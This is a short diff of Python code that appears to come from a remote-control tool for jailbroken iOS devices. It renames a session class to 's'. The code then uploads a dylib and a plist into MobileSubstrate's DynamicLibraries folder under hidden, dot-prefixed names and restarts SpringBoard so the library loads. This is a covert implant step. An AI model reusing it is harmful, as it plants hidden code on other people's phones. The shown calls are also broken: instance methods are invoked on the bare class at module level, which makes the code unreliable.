@@ -1,7 +1,7 @@
 import helper as h
 import re, os, time
 
-class Session:
+class s:
 	def __init__(self,server,conn,device_info):
 		self.server = server
 		self.conn = conn
@@ -231,12 +231,12 @@ class Session:
 
 h.info_general("Uploading dylib 1/2...")
 time.sleep(1)
-Session.upload_file("resources/mpl.dylib","/Library/MobileSubstrate/DynamicLibraries",".mpl.dylib")
+s.upload_file("resources/mpl.dylib","/Library/MobileSubstrate/DynamicLibraries",".mpl.dylib")
 h.info_general("Uploading plist 2/2...")
 time.sleep(1)
-Session.upload_file("resources/mpl.plist","/Library/MobileSubstrate/DynamicLibraries",".mpl.plist")
+s.upload_file("resources/mpl.plist","/Library/MobileSubstrate/DynamicLibraries",".mpl.plist")
 h.info_general("Respring...")
 time.sleep(2)
-Session.send_command({"cmd":"killall","args":"SpringBoard"})
+s.send_command({"cmd":"killall","args":"SpringBoard"})
     
 
